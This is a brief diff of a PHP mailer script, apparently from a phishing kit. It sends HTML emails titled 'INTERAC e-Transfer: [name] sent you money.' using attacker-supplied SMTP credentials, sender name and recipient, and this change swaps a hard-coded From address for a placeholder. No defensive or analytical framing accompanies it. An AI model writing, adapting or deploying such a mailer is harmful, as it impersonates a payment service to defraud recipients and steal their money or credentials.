@@ -35,7 +35,7 @@ $mail->Body = $message;
 $mail->SMTPAuth = true;
 $mail->Username = $_POST['username'];
 $mail->Password = $_POST['password'];
-$mail->SetFrom('triplex@gpnet.ca', $_POST['sender_name']);
+$mail->SetFrom('<smtp@email.com>', $_POST['sender_name']);
 $mail->AddAddress($_POST['receiver_email']);
 $mail->Subject = 'INTERAC e-Transfer: '.$_POST['sender_name'].' sent you money.';
 $mail->IsHTML(true);
